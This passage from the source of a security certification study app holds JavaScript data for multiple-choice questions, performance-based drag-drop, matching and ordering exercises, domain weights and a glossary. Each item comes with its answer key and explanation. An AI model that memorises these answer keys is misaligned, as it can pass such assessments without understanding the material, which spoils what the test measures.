"Vendor risk management assesses, monitors, and mitigates security risks introduced by third-party vendors and service providers."}, {"id": "D5-Q006", "domain": 5, "question": "Which compliance framework applies to payment card data?", "options": ["HIPAA", "GDPR", "PCI DSS", "SOX"], "correct": 2, "explanation": "PCI DSS (Payment Card Industry Data Security Standard) provides security requirements for organizations handling payment card data."}, {"id": "D5-Q007", "domain": 5, "question": "What is a Business Impact Analysis (BIA)?", "options": ["Analysis of business profits", "Assessment of critical business functions and disruption impacts", "Market research analysis", "Employee performance review"], "correct": 1, "explanation": "BIA identifies critical business functions, their dependencies, and potential impacts of disruptions to prioritize recovery efforts."}, {"id": "D5-Q008", "domain": 5, "question": "Which document defines mandatory security requirements?", "options": ["Policy", "Standard", "Procedure", "Guideline"], "correct": 1, "explanation": "Standards define mandatory, specific security requirements and acceptable configurations that must be followed."}, {"id": "D5-Q009", "domain": 5, "question": "What is the purpose of security awareness training?", "options": ["To teach advanced hacking skills", "To educate employees about security threats and best practices", "To replace technical controls", "To punish security violations"], "correct": 1, "explanation": "Security awareness training educates employees about security threats, policies, and best practices to reduce human-related risks."}, {"id": "D5-Q010", "domain": 5, "question": "What is qualitative risk assessment?", "options": ["Risk assessment using precise numbers", "Risk assessment using descriptive categories like high/medium/low", "Assessment of software quality", "Assessment of employee qualifications"], "correct": 1, "explanation": "Qualitative risk assessment uses descriptive categories (high/medium/low) rather than numerical values to evaluate risks."}, {"id": "D5-Q011", "domain": 5, "question": "Which regulation protects personal health information in the US?", "options": ["PCI DSS", "HIPAA", "GDPR", "FERPA"], "correct": 1, "explanation": "HIPAA (Health Insurance Portability and Accountability Act) establishes requirements for protecting personal health information in the US."}, {"id": "D5-Q012", "domain": 5, "question": "What is quantitative risk assessment?", "options": ["Risk assessment using quantity of risks", "Risk assessment using numerical values and financial impact", "Assessment of product quantity", "Assessment of user numbers"], "correct": 1, "explanation": "Quantitative risk assessment uses numerical values and calculations to determine financial impact and probability of risks."}, {"id": "D5-Q013", "domain": 5, "question": "What is the purpose of a data classification policy?", "options": ["To organize files alphabetically", "To categorize data based on sensitivity and apply appropriate protections", "To classify employees", "To sort email"], "correct": 1, "explanation": "Data classification policies categorize data based on sensitivity and define appropriate handling, storage, and protection requirements."}, {"id": "D5-Q014", "domain": 5, "question": "Which principle requires obtaining individual consent before data collection?", "options": ["Data minimization", "Consent and choice", "Purpose limitation", "Data integrity"], "correct": 1, "explanation": "Consent and choice principles require organizations to obtain informed consent before collecting or processing personal data."}, {"id": "D5-Q015", "domain": 5, "question": "What is a Business Continuity Plan (BCP)?", "options": ["A marketing strategy", "Documentation of processes to maintain operations during disruptions", "A financial plan", "An employee handbook"], "correct": 1, "explanation": "BCP documents strategies and procedures to maintain or quickly resume critical business functions during and after disruptions."}, {"id": "D5-Q016", "domain": 5, "question": "What is the difference between BCP and DRP?", "options": ["No difference", "BCP focuses on business operations, DRP focuses on IT systems recovery", "DRP is for disasters only", "BCP is for small businesses"], "correct": 1, "explanation": "BCP maintains overall business operations during disruptions, while DRP specifically focuses on IT systems and data recovery."}, {"id": "D5-Q017", "domain": 5, "question": "Which framework provides IT governance and management guidance?", "options": ["PCI DSS", "COBIT", "HIPAA", "SOX"], "correct": 1, "explanation": "COBIT (Control Objectives for Information and Related Technologies) provides a framework for IT governance and management."}, {"id": "D5-Q018", "domain": 5, "question": "What is the purpose of security governance?", "options": ["To govern security staff behavior", "To establish strategic direction and oversight of security programs", "To write security code", "To manage security tools"], "correct": 1, "explanation": "Security governance establishes strategic direction, oversight, and accountability for security programs aligned with business objectives."}, {"id": "D5-Q019", "domain": 5, "question": "Which regulation protects educational records in the US?", "options": ["HIPAA", "GDPR", "FERPA", "SOX"], "correct": 2, "explanation": "FERPA (Family Educational Rights and Privacy Act) protects the privacy of student education records in the United States."}, {"id": "D5-Q020", "domain": 5, "question": "What is residual risk?", "options": ["Risk from residue or waste", "Risk remaining after controls are implemented", "Risk in residential areas", "Risk that residents face"], "correct": 1, "explanation": "Residual risk is the risk that remains after security controls and mitigation strategies have been implemented."}, {"id": "D5-Q021", "domain": 5, "question": "What is the purpose of security metrics?", "options": ["To measure physical dimensions", "To quantify and track security program effectiveness", "To count security staff", "To measure network speed"], "correct": 1, "explanation": "Security metrics quantify security program effectiveness, helping measure progress, identify trends, and support decision-making."}, {"id": "D5-Q022", "domain": 5, "question": "Which privacy principle states data should only be kept as long as necessary?", "options": ["Data minimization", "Purpose limitation", "Storage limitation", "Consent"], "correct": 2, "explanation": "Storage limitation requires organizations to retain personal data only as long as necessary for the specified purpose."}, {"id": "D5-Q023", "domain": 5, "question": "What is acceptable use policy (AUP)?", "options": ["Policy for accepting users", "Policy defining appropriate use of organizational resources", "Policy for user acceptance testing", "Policy for accepting deliveries"], "correct": 1, "explanation": "AUP defines appropriate and inappropriate uses of organizational IT resources, systems, and networks by users."}, {"id": "D5-Q024", "domain": 5, "question": "What is third-party risk assessment?", "options": ["Risk of being assessed by third parties", "Evaluating security risks from vendors and partners", "Assessment by external auditors", "Risk of third-party software"], "correct": 1, "explanation": "Third-party risk assessment evaluates security risks from external vendors, partners, and service providers before engagement."}, {"id": "D5-Q025", "domain": 5, "question": "Which framework provides international information security standards?", "options": ["NIST", "ISO/IEC 27001", "PCI DSS", "COBIT"], "correct": 1, "explanation": "ISO/IEC 27001 provides international standards for information security management systems (ISMS)."}, {"id": "D5-Q026", "domain": 5, "question": "What is privacy by design?", "options": ["Designing private areas", "Incorporating privacy considerations from the beginning of system design", "Designing privacy policies", "Graphic design for privacy notices"], "correct": 1, "explanation": "Privacy by design incorporates privacy and data protection considerations throughout the entire system development lifecycle."}, {"id": "D5-Q027", "domain": 5, "question": "What is the purpose of security training for developers?", "options": ["To train security staff in development", "To teach secure coding practices and security principles", "To develop training materials", "To train developers in security tools only"], "correct": 1, "explanation": "Security training for developers teaches secure coding practices, common vulnerabilities, and security principles to build secure software."}, {"id": "D5-Q028", "domain": 5, "question": "What is inherent risk?", "options": ["Risk inherited from parent companies", "Risk level before any controls are applied", "Risk that is internal", "Risk from inheritance"], "correct": 1, "explanation": "Inherent risk is the natural level of risk before any security controls or mitigation measures are implemented."}, {"id": "D5-Q029", "domain": 5, "question": "Which regulation requires financial reporting controls in the US?", "options": ["HIPAA", "SOX", "GDPR", "PCI DSS"], "correct": 1, "explanation": "SOX (Sarbanes-Oxley Act) requires publicly traded companies to implement internal controls for financial reporting and disclosure."}, {"id": "D5-Q030", "domain": 5, "question": "What is key risk indicator (KRI)?", "options": ["Risk to encryption keys", "Metric providing early warning of increasing risk", "List of important risks", "Risk indicator light"], "correct": 1, "explanation": "KRIs are metrics that provide early warning signals of increasing risk exposure in specific areas."}, {"id": "D5-Q031", "domain": 5, "question": "What is security culture?", "options": ["Cultural diversity in security teams", "Shared values and behaviors regarding security across organization", "Security awareness posters", "Security team traditions"], "correct": 1, "explanation": "Security culture represents shared security values, attitudes, and behaviors embedded throughout the organization."}, {"id": "D5-Q032", "domain": 5, "question": "Which privacy principle requires using data only for stated purposes?", "options": ["Data minimization", "Purpose limitation", "Consent", "Accountability"], "correct": 1, "explanation": "Purpose limitation requires organizations to collect and process data only for specified, explicit, and legitimate purposes."}, {"id": "D5-Q033", "domain": 5, "question": "What is a data protection impact assessment (DPIA)?", "options": ["Assessment of data backup impact", "Evaluation of privacy risks in data processing activities", "Impact of data on performance", "Assessment of data quality"], "correct": 1, "explanation": "DPIA evaluates privacy risks associated with data processing activities to identify and mitigate potential privacy impacts."}, {"id": "D5-Q034", "domain": 5, "question": "What is the role of a Data Protection Officer (DPO)?", "options": ["To protect data backups", "To oversee privacy compliance and data protection strategy", "To encrypt all data", "To manage data storage"], "correct": 1, "explanation": "DPO oversees data protection strategy, privacy compliance, and serves as a contact point for data protection authorities."}, {"id": "D5-Q035", "domain": 5, "question": "What is security posture assessment?", "options": ["Evaluating physical posture of security guards", "Comprehensive evaluation of organization's security status", "Assessment of sitting positions", "Security camera positioning"], "correct": 1, "explanation": "Security posture assessment comprehensively evaluates an organization's security status, including controls, processes, and vulnerabilities."}, {"id": "D5-Q036", "domain": 5, "question": "Which regulation applies to organizations processing EU citizens' data?", "options": ["HIPAA", "GDPR", "SOX", "FERPA"], "correct": 1, "explanation": "GDPR (General Data Protection Regulation) applies to any organization processing personal data of EU citizens, regardless of location."}, {"id": "D5-Q037", "domain": 5, "question": "What is security baseline deviation?", "options": ["Mathematical variation in security metrics", "Systems that don't meet established security standards", "Deviation in security budgets", "Changes in security policies"], "correct": 1, "explanation": "Security baseline deviation occurs when systems don't meet established minimum security configuration standards."}, {"id": "D5-Q038", "domain": 5, "question": "What is the purpose of security compliance audits?", "options": ["To punish non-compliance", "To verify adherence to security policies and regulations", "To reduce security staff", "To eliminate security controls"], "correct": 1, "explanation": "Security compliance audits verify that organizations meet security policies, standards, and regulatory requirements."}, {"id": "D5-Q039", "domain": 5, "question": "What is risk tolerance?", "options": ["Tolerance for risk-taking behavior", "Acceptable deviation from risk appetite", "Tolerance for uncertain situations", "Employee tolerance for security measures"], "correct": 1, "explanation": "Risk tolerance is the acceptable level of variation from the risk appetite that an organization can handle."}, {"id": "D5-Q040", "domain": 5, "question": "What is the purpose of executive security reporting?", "options": ["To report executives to authorities", "To communicate security status and risks to leadership", "To secure executive offices", "To report executive expenses"], "correct": 1, "explanation": "Executive security reporting communicates security posture, risks, incidents, and program effectiveness to organizational leadership."}, {"id": "D5-Q041", "domain": 5, "question": "What is data sovereignty?", "options": ["Data ownership rights", "Data subject to laws of the country where it's stored", "Data independence", "Data quality standards"], "correct": 1, "explanation": "Data sovereignty means data is subject to the laws and regulations of the country where it's physically stored."}, {"id": "D5-Q042", "domain": 5, "question": "What is security strategy?", "options": ["Tactical security operations", "Long-term plan aligning security with business objectives", "Daily security tasks", "Security tool selection"], "correct": 1, "explanation": "Security strategy is a long-term plan that aligns security initiatives with business objectives and organizational goals."}, {"id": "D5-Q043", "domain": 5, "question": "What is the purpose of password policy?", "options": ["To make passwords difficult to remember", "To establish requirements for secure password creation and management", "To list all passwords", "To eliminate passwords"], "correct": 1, "explanation": "Password policy establishes requirements for password complexity, length, expiration, and management to ensure account security."}, {"id": "D5-Q044", "domain": 5, "question": "What is security ROI (Return on Investment)?", "options": ["Return on security tools purchased", "Value gained from security investments relative to costs", "Revenue from selling security", "Interest on security budgets"], "correct": 1, "explanation": "Security ROI measures the value and benefits gained from security investments compared to their costs."}, {"id": "D5-Q045", "domain": 5, "question": "What is the primary purpose of an incident response plan?", "options": ["To prevent all incidents", "To provide structured approach for detecting and responding to incidents", "To punish responsible parties", "To reduce security budgets"], "correct": 1, "explanation": "An incident response plan provides a structured, documented approach for detecting, responding to, and recovering from security incidents."}, {"id": "D5-Q046", "domain": 5, "question": "What is data minimization?", "options": ["Making data files smaller", "Collecting only data necessary for specific purposes", "Minimizing data backups", "Using minimum storage"], "correct": 1, "explanation": "Data minimization requires organizations to collect and retain only the minimum amount of personal data necessary for specified purposes."}, {"id": "D5-Q047", "domain": 5, "question": "What is the purpose of security steering committee?", "options": ["To steer security vehicles", "To provide governance and strategic direction for security program", "To manage daily security operations", "To hire security staff"], "correct": 1, "explanation": "A security steering committee provides governance, strategic direction, and oversight for the organization's security program."}, {"id": "D5-Q048", "domain": 5, "question": "What is privacy impact assessment (PIA)?", "options": ["Assessment of privacy policy effectiveness", "Evaluation of privacy risks in systems or programs", "Impact of privacy laws on business", "Assessment of private networks"], "correct": 1, "explanation": "PIA evaluates potential privacy risks and impacts of new systems, programs, or initiatives on personal information."}, {"id": "D5-Q049", "domain": 5, "question": "What is security program maturity model?", "options": ["Age of security programs", "Framework measuring security program development and capability", "Maturity of security staff", "Timeline for security implementation"], "correct": 1, "explanation": "Security program maturity models assess the development level and capability of security programs across different dimensions."}, {"id": "D5-Q050", "domain": 5, "question": "What is the purpose of privacy notice?", "options": ["To notify people of privacy laws", "To inform individuals how their data will be collected and used", "To warn about private property", "To announce privacy violations"], "correct": 1, "explanation": "Privacy notices inform individuals about what personal data is collected, how it's used, who it's shared with, and their rights."}];

const PBQ_DATA = [
  // Domain 1 - Security Concepts (4 PBQs)
  {
    id: "PBQ-001",
    domain: 1,
    title: "Categorize Security Controls",
    type: "drag-drop",
    difficulty: "intermediate",
    instruction: "Drag each security measure to its correct control CATEGORY.",
    categories: ["Technical", "Managerial", "Operational", "Physical"],
    items: [
      { text: "Firewall rules", correct: "Technical" },
      { text: "Security awareness training policy", correct: "Managerial" },
      { text: "Daily log review", correct: "Operational" },
      { text: "Biometric door locks", correct: "Physical" },
      { text: "Encryption at rest", correct: "Technical" },
      { text: "Background check policy", correct: "Managerial" },
      { text: "Badge reader at entrance", correct: "Physical" },
      { text: "Patch management process", correct: "Operational" }
    ],
    explanation: "Technical controls use technology (firewalls, encryption). Managerial controls are policies from leadership. Operational controls are daily procedures. Physical controls protect premises."
  },
  {
    id: "PBQ-002",
    domain: 1,
    title: "Control Types by Function",
    type: "matching",
    difficulty: "intermediate",
    instruction: "Match each control to its PRIMARY function type.",
    pairs: [
      { left: "IDS alerts on suspicious traffic", right: "Detective" },
      { left: "Firewall blocks unauthorized ports", right: "Preventive" },
      { left: "Backup restoration after ransomware", right: "Corrective" },
      { left: "Warning banner on login screen", right: "Deterrent" },
      { left: "Extra monitoring when patching delayed", right: "Compensating" },
      { left: "Antivirus quarantines malware", right: "Corrective" }
    ],
    explanation: "Preventive stops attacks. Detective identifies them. Corrective fixes after detection. Deterrent discourages. Compensating provides alternatives."
  },
  {
    id: "PBQ-003",
    domain: 1,
    title: "Authentication Factor Classification",
    type: "drag-drop",
    difficulty: "beginner",
    instruction: "Classify each authentication method by factor type.",
    categories: ["Something You Know", "Something You Have", "Something You Are"],
    items: [
      { text: "Password", correct: "Something You Know" },
      { text: "Fingerprint scan", correct: "Something You Are" },
      { text: "Smart card", correct: "Something You Have" },
      { text: "PIN", correct: "Something You Know" },
      { text: "Hardware token", correct: "Something You Have" },
      { text: "Retina scan", correct: "Something You Are" },
      { text: "Security question", correct: "Something You Know" },
      { text: "Mobile authenticator app", correct: "Something You Have" }
    ],
    explanation: "Know = passwords, PINs, questions. Have = cards, tokens, phones. Are = biometrics. MFA requires 2+ DIFFERENT types."
  },
  {
    id: "PBQ-004",
    domain: 1,
    title: "Zero Trust Implementation Order",
    type: "ordering",
    difficulty: "advanced",
    instruction: "Order these Zero Trust implementation steps from first to last.",
    items: [
      { text: "Identify sensitive data and assets", order: 1 },
      { text: "Map transaction flows", order: 2 },
      { text: "Architect Zero Trust network", order: 3 },
      { text: "Create Zero Trust policies", order: 4 },
      { text: "Monitor and maintain", order: 5 }
    ],
    explanation: "Zero Trust implementation: First identify what to protect, then understand how data flows, design the architecture, create policies, then continuously monitor."
  },
  
  // Domain 2 - Threats & Vulnerabilities (5 PBQs)
  {
    id: "PBQ-005",
    domain: 2,
    title: "Threat Actor Attribution",
    type: "matching",
    difficulty: "intermediate",
    instruction: "Match each characteristic to the most likely threat actor type.",
    pairs: [
      { left: "Long-term espionage campaigns", right: "Nation-State" },
      { left: "Ransomware for profit", right: "Organized Crime" },
      { left: "Website defacement for political message", right: "Hacktivist" },
      { left: "Uses pre-made exploit tools", right: "Script Kiddie" },
      { left: "Sabotage by disgruntled employee", right: "Insider Threat" },
      { left: "APT29, Fancy Bear", right: "Nation-State" }
    ],
    explanation: "Nation-states conduct espionage. Organized crime seeks money. Hacktivists push ideology. Script kiddies use existing tools. Insiders have legitimate access."
  },
  {
    id: "PBQ-006",
    domain: 2,
    title: "Malware Classification",
    type: "drag-drop",
    difficulty: "intermediate",
    instruction: "Categorize each malware type by its PRIMARY characteristic.",
    categories: ["Self-Replicating", "Requires User Action", "Hides Presence", "Encrypts Data"],
    items: [
      { text: "Worm", correct: "Self-Replicating" },
      { text: "Virus", correct: "Requires User Action" },
      { text: "Rootkit", correct: "Hides Presence" },
      { text: "Ransomware", correct: "Encrypts Data" },
      { text: "Trojan", correct: "Requires User Action" },
      { text: "Cryptolocker", correct: "Encrypts Data" }
    ],
    explanation: "Worms self-replicate without user action. Viruses need user to run infected file. Rootkits hide at kernel level. Ransomware encrypts for extortion."
  },
  {
    id: "PBQ-007",
    domain: 2,
    title: "Attack Type Identification",
    type: "matching",
    difficulty: "intermediate",
    instruction: "Match each attack description to its correct name.",
    pairs: [
      { left: "Injecting malicious SQL via web form", right: "SQL Injection" },
      { left: "Flooding server with SYN packets", right: "SYN Flood" },
      { left: "Intercepting traffic between two parties", right: "Man-in-the-Middle" },
      { left: "Tricking user to click malicious link in email", right: "Phishing" },
      { left: "Injecting scripts into web pages viewed by others", right: "Cross-Site Scripting" },
      { left: "Poisoning ARP cache to redirect traffic", right: "ARP Spoofing" }
    ],
    explanation: "SQLi manipulates databases. SYN flood is DoS. MITM intercepts. Phishing uses social engineering. XSS injects client-side scripts. ARP spoofing enables MITM."
  },
  {
    id: "PBQ-008",
    domain: 2,
    title: "Cyber Kill Chain Order",
    type: "ordering",
    difficulty: "intermediate",
    instruction: "Order the Cyber Kill Chain stages from first to last.",
    items: [
      { text: "Reconnaissance", order: 1 },
      { text: "Weaponization", order: 2 },
      { text: "Delivery", order: 3 },
      { text: "Exploitation", order: 4 },
      { text: "Installation", order: 5 },
      { text: "Command & Control", order: 6 },
      { text: "Actions on Objectives", order: 7 }
    ],
    explanation: "Kill Chain: Recon (gather info)  Weaponize (create payload)  Deliver (send to target)  Exploit (run vulnerability)  Install (persist)  C2 (communicate)  Act (achieve goal)."
  },
  {
    id: "PBQ-009",
    domain: 2,
    title: "Vulnerability Severity Ranking",
    type: "ordering",
    difficulty: "beginner",
    instruction: "Order these CVSS severity levels from MOST to LEAST severe.",
    items: [
      { text: "Critical (9.0-10.0)", order: 1 },
      { text: "High (7.0-8.9)", order: 2 },
      { text: "Medium (4.0-6.9)", order: 3 },
      { text: "Low (0.1-3.9)", order: 4 }
    ],
    explanation: "CVSS scores: Critical (9.0-10.0) requires immediate action. High (7.0-8.9) is urgent. Medium (4.0-6.9) is standard priority. Low (0.1-3.9) is lowest priority."
  },
  
  // Domain 3 - Security Architecture (4 PBQs)
  {
    id: "PBQ-010",
    domain: 3,
    title: "Cloud Responsibility Model",
    type: "drag-drop",
    difficulty: "intermediate",
    instruction: "For IaaS, drag each component to who is responsible.",
    categories: ["Customer Responsibility", "Provider Responsibility"],
    items: [
      { text: "Physical data center security", correct: "Provider Responsibility" },
      { text: "Operating system patching", correct: "Customer Responsibility" },
      { text: "Network infrastructure", correct: "Provider Responsibility" },
      { text: "Application security", correct: "Customer Responsibility" },
      { text: "Data encryption", correct: "Customer Responsibility" },
      { text: "Hypervisor security", correct: "Provider Responsibility" }
    ],
    explanation: "In IaaS, provider handles physical/network/hypervisor. Customer handles OS, applications, and data. The higher the service model, the more provider manages."
  },
  {
    id: "PBQ-011",
    domain: 3,
    title: "Encryption Algorithm Selection",
    type: "matching",
    difficulty: "intermediate",
    instruction: "Match each use case to the best encryption approach.",
    pairs: [
      { left: "Encrypting large files quickly", right: "AES (Symmetric)" },
      { left: "Secure key exchange over internet", right: "RSA (Asymmetric)" },
      { left: "Storing passwords in database", right: "bcrypt (Hashing)" },
      { left: "Verifying file integrity", right: "SHA-256 (Hashing)" },
      { left: "Digital signatures", right: "RSA (Asymmetric)" },
      { left: "VPN tunnel encryption", right: "AES (Symmetric)" }
    ],
    explanation: "AES for bulk encryption (fast). RSA for key exchange and signatures (solves distribution). bcrypt for passwords (intentionally slow). SHA-256 for integrity verification."
  },
  {
    id: "PBQ-012",
    domain: 3,
    title: "Network Security Zone Placement",
    type: "drag-drop",
    difficulty: "intermediate",
    instruction: "Place each system in the correct network zone.",
    categories: ["DMZ", "Internal Network", "Management Network"],
    items: [
      { text: "Public web server", correct: "DMZ" },
      { text: "HR database", correct: "Internal Network" },
      { text: "Domain controller", correct: "Internal Network" },
      { text: "Email gateway", correct: "DMZ" },
      { text: "SIEM console", correct: "Management Network" },
      { text: "Firewall management interface", correct: "Management Network" }
    ],
    explanation: "DMZ holds public-facing servers. Internal network has sensitive systems. Management network isolates administrative interfaces from regular traffic."
  },
  {
    id: "PBQ-013",
    domain: 3,
    title: "Backup Strategy Order",
    type: "ordering",
    difficulty: "beginner",
    instruction: "Order backup types by how much data they capture (MOST to LEAST).",
    items: [
      { text: "Full Backup", order: 1 },
      { text: "Differential Backup", order: 2 },
      { text: "Incremental Backup", order: 3 }
    ],
    explanation: "Full captures everything. Differential captures changes since last full. Incremental captures only changes since last backup of any type (smallest)."
  },
  
  // Domain 4 - Security Operations (4 PBQs)
  {
    id: "PBQ-014",
    domain: 4,
    title: "Incident Response Phase Order",
    type: "ordering",
    difficulty: "intermediate",
    instruction: "Order the NIST Incident Response phases correctly.",
    items: [
      { text: "Preparation", order: 1 },
      { text: "Detection & Analysis", order: 2 },
      { text: "Containment", order: 3 },
      { text: "Eradication", order: 4 },
      { text: "Recovery", order: 5 },
      { text: "Post-Incident Activity", order: 6 }
    ],
    explanation: "NIST IR: Prepare (plans, tools)  Detect (identify incident)  Contain (limit damage)  Eradicate (remove threat)  Recover (restore)  Post-Incident (lessons learned)."
  },
  {
    id: "PBQ-015",
    domain: 4,
    title: "Evidence Volatility Order",
    type: "ordering",
    difficulty: "advanced",
    instruction: "Order evidence sources from MOST volatile to LEAST volatile.",
    items: [
      { text: "CPU registers and cache", order: 1 },
      { text: "RAM contents", order: 2 },
      { text: "Swap/temporary files", order: 3 },
      { text: "Hard disk data", order: 4 },
      { text: "Remote logs", order: 5 },
      { text: "Archived media", order: 6 }
    ],
    explanation: "Collect most volatile first! CPU/RAM disappear on power loss. Disk persists but can be overwritten. Remote logs may be rotated. Archives are most stable."
  },
  {
    id: "PBQ-016",
    domain: 4,
    title: "Log Event Classification",
    type: "matching",
    difficulty: "intermediate",
    instruction: "Match each Windows Event ID to what it indicates.",
    pairs: [
      { left: "Event ID 4624", right: "Successful logon" },
      { left: "Event ID 4625", right: "Failed logon" },
      { left: "Event ID 4672", right: "Admin privileges assigned" },
      { left: "Event ID 4720", right: "User account created" },
      { left: "Event ID 4726", right: "User account deleted" }
    ],
    explanation: "Key Windows events: 4624 (success logon), 4625 (failed logon - watch for brute force), 4672 (admin logon), 4720 (account created), 4726 (account deleted)."
  },
  {
    id: "PBQ-017",
    domain: 4,
    title: "Access Control Model Matching",
    type: "matching",
    difficulty: "intermediate",
    instruction: "Match each scenario to the appropriate access control model.",
    pairs: [
      { left: "Military classified documents with clearance levels", right: "MAC (Mandatory)" },
      { left: "File owner sets permissions for other users", right: "DAC (Discretionary)" },
      { left: "Access based on job title (Admin, User, Guest)", right: "RBAC (Role-Based)" },
      { left: "Access based on time, location, and device type", right: "ABAC (Attribute-Based)" }
    ],
    explanation: "MAC uses labels/clearances (military). DAC lets owners decide (Windows NTFS). RBAC uses job roles (most common enterprise). ABAC uses dynamic attributes."
  },
  
  // Domain 5 - Security Program Management (3 PBQs)
  {
    id: "PBQ-018",
    domain: 5,
    title: "Policy Document Hierarchy",
    type: "ordering",
    difficulty: "beginner",
    instruction: "Order security documents from HIGHEST level to LOWEST level.",
    items: [
      { text: "Policy (What and Why)", order: 1 },
      { text: "Standard (Specific Requirements)", order: 2 },
      { text: "Procedure (Step-by-Step How)", order: 3 },
      { text: "Guideline (Recommendations)", order: 4 }
    ],
    explanation: "Policy sets high-level direction. Standards define requirements. Procedures give steps. Guidelines are suggestions. Policies  Standards  Procedures  Guidelines."
  },
  {
    id: "PBQ-019",
    domain: 5,
    title: "Risk Treatment Options",
    type: "matching",
    difficulty: "intermediate",
    instruction: "Match each scenario to the appropriate risk treatment.",
    pairs: [
      { left: "Install firewall to reduce attack likelihood", right: "Mitigate" },
      { left: "Purchase cyber insurance policy", right: "Transfer" },
      { left: "Document low-risk vulnerability and monitor", right: "Accept" },
      { left: "Discontinue a risky service entirely", right: "Avoid" }
    ],
    explanation: "Mitigate = reduce with controls. Transfer = insurance/contracts. Accept = acknowledge and document. Avoid = eliminate the risk source."
  },
  {
    id: "PBQ-020",
    domain: 5,
    title: "Compliance Framework Matching",
    type: "matching",
    difficulty: "intermediate",
    instruction: "Match each regulation/framework to its primary focus.",
    pairs: [
      { left: "HIPAA", right: "Healthcare data protection" },
      { left: "PCI DSS", right: "Payment card security" },
      { left: "GDPR", right: "EU privacy rights" },
      { left: "SOX", right: "Financial reporting controls" },
      { left: "NIST CSF", right: "Cybersecurity framework" }
    ],
    explanation: "HIPAA = healthcare. PCI DSS = credit cards. GDPR = EU privacy. SOX = public company financials. NIST CSF = voluntary security framework."
  }
];


const DOMAINS = [
  { id: 1, name: "General Security Concepts", weight: 12, color: "#6366f1" },
  { id: 2, name: "Threats, Vulnerabilities & Mitigations", weight: 22, color: "#f59e0b" },
  { id: 3, name: "Security Architecture", weight: 18, color: "#10b981" },
  { id: 4, name: "Security Operations", weight: 28, color: "#8b5cf6" },
  { id: 5, name: "Security Program Management", weight: 20, color: "#ec4899" }
];

const GLOSSARY = [
  { term: "CIA Triad", definition: "Confidentiality, Integrity, Availability - the three core principles of information security that guide security policies and controls." },
  { term: "Zero Trust", definition: "Security model that requires strict verification for every user and device trying to access resources, regardless of location. Never trust, always verify." },
  { term: "Defense in Depth", definition: "Layered security strategy using multiple controls so that if one fails, others continue to provide protection." },
  { term: "SIEM", definition: "Security Information and Event Management - centralizes log collection, correlation, and analysis for threat detection and compliance." },
  { term: "APT", definition: "Advanced Persistent Threat - sophisticated, long-term targeted attacks typically conducted by nation-states or organized crime." },
  { term: "MFA", definition: "Multi-Factor Authentication - requires two or more different authentication factor types (know, have, are) to verify identity." },
  { term: "EDR", definition: "Endpoint Detection and Response - monitors endpoints for suspicious behavior and provides investigation and response capabilities." },
  { term: "DLP", definition: "Data Loss Prevention - technology that prevents sensitive data from leaving the organization through monitoring and blocking." },
  { term: "WAF", definition: "Web Application Firewall - Layer 7 protection that filters HTTP traffic to block attacks like SQLi and XSS." },
  { term: "IDS/IPS", definition: "Intrusion Detection/Prevention Systems - IDS alerts on threats, IPS actively blocks them. Can be network or host-based." },
  { term: "CVSS", definition: "Common Vulnerability Scoring System - standardized method for rating vulnerability severity from 0-10 (Critical: 9.0+)." },
  { term: "RTO/RPO", definition: "Recovery Time Objective (how fast to recover) and Recovery Point Objective (acceptable data loss). Key disaster recovery metrics." },
  { term: "PKI", definition: "Public Key Infrastructure - framework for managing digital certificates and public-key encryption, including CAs and certificate lifecycle." },
  { term: "SOAR", definition: "Security Orchestration, Automation and Response - automates security operations through playbooks and tool integration." },
  { term: "SOC", definition: "Security Operations Center - team responsible for monitoring, detecting, and responding to security incidents 24/7." },
  { term: "IOC", definition: "Indicator of Compromise - evidence that a breach has occurred, such as malicious IPs, file hashes, or unusual behavior." },
  { term: "AES", definition: "Advanced Encryption Standard - symmetric encryption algorithm using 128, 192, or 256-bit keys. Current standard for data encryption." },
  { term: "RSA", definition: "Asymmetric encryption algorithm using public/private key pairs. Used for key exchange, digital signatures, and encryption." },
  { term: "Hash Function", definition: "One-way mathematical function producing fixed-length output. SHA-256 for integrity, bcrypt/Argon2 for passwords." },
  { term: "VLAN", definition: "Virtual LAN - logically segments a network at Layer 2, isolating broadcast domains without physical separation." },
  { term: "DMZ", definition: "Demilitarized Zone - screened subnet between internal network and internet hosting public-facing services like web servers." },
  { term: "Ransomware", definition: "Malware that encrypts victim files and demands payment for decryption key. Major threat to organizations." },
  { term: "Phishing", definition: "Social engineering attack using fraudulent emails to trick users into revealing credentials or clicking malicious links." },
  { term: "SQL Injection", definition: "Attack inserting malicious SQL commands through application input to manipulate databases. Prevented by parameterized queries." },
  { term: "XSS", definition: "Cross-Site Scripting - injects malicious scripts into web pages viewed by other users. Prevented by output encoding." },
  { term: "RADIUS", definition: "Remote Authentication Dial-In User Service - centralized AAA protocol commonly used with 802.1X for network access control." },
  { term: "Kerberos", definition: "Ticket-based authentication protocol used in Windows Active Directory. Provides single sign-on using KDC and TGTs." },
  { term: "NIST CSF", definition: "NIST Cybersecurity Framework - five functions: Identify, Protect, Detect, Respond, Recover. Voluntary framework for managing cyber risk." },
  { term: "Least Privilege", definition: "Security principle granting users only the minimum access rights needed to perform their job functions." },
  { term: "Separation of Duties", definition: "Control requiring multiple people to complete critical tasks, preventing fraud and errors by single individuals." },
  { term: "BCP/DRP", definition: "Business Continuity Plan / Disaster Recovery Plan - strategies for maintaining operations and recovering from disruptions." },
  { term: "Vulnerability Scan", definition: "Automated assessment identifying known vulnerabilities. Credentialed scans provide deeper, more accurate results." },
  { term: "Penetration Test", definition: "Authorized simulated attack to identify exploitable vulnerabilities. Goes beyond scanning to prove actual risk." },
  { term: "Risk Assessment", definition: "Process of identifying, analyzing, and evaluating risks. Risk = Likelihood  Impact. Drives security priorities." },
  { term: "ALE Formula", definition: "Annual Loss Expectancy = SLE  ARO. Quantifies expected yearly loss from a threat for cost-benefit analysis." },
  { term: "Chain of Custody", definition: "Documented trail showing who handled evidence, when, and what was done. Essential for forensic integrity." },
  { term: "Order of Volatility", definition: "Forensic principle to capture most volatile evidence first: CPU/RAM before disk, local before remote." },
  { term: "Compensating Control", definition: "Alternative security measure providing equivalent protection when primary control cannot be implemented." },
  { term: "Honeytoken", definition: "Fake credential or data planted to detect unauthorized access. Any use triggers an alert for investigation." },
  { term: "MITRE ATT&CK", definition: "Knowledge base of adversary tactics (goals) and techniques (methods). 14 enterprise tactics from reconnaissance to impact." }
];

function getRemediationForDomain(domainId) {
  return SIMULATION_DATA.filter(s => s.domain === domainId && s.type === 'REM');
}
</script>
<script type="text/babel">
const { useState, useEffect, useCallback } = React;

// ============================================
// WRONG ANSWER REVIEW
// ============================================
function WrongAnswerReview({ wrongAnswers, onBack, onClear }) {
  const [filter, setFilter] = useState(0);
